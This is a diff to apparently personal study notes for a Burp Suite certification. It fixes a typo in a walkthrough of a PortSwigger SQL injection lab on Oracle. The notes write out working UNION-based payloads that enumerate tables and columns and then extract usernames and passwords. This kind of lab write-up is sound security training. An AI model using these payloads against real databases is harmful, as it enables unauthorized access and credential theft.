@@ -97,7 +97,7 @@
 ## SQL injection attack, listing the database contents on Oracle
 - Remember, since it's an Oracle database, every SELECT statement must specify a table to select FROM. There is a built-in table on Oracle called `dual` which you can use for this, so let's use `' UNION SELECT 'abc',NULL FROM dual` - our first guess of two columns was right!
 - Grab the tables with `' UNION SELECT table_name,NULL FROM all_tables--` with help from the [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet). Note table USERS_GVBORM.
-- Grab the columsn from this table with `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GVBORM'--`
+- Grab the columns from this table with `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GVBORM'--`
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/f416588a-d337-46bc-9bdd-a2641d8fb453)
 - Use `' UNION SELECT USERNAME_PLXSAJ,PASSWORD_FSYMXF FROM USERS_GVBORM--` to grab the users and passwords. 
 
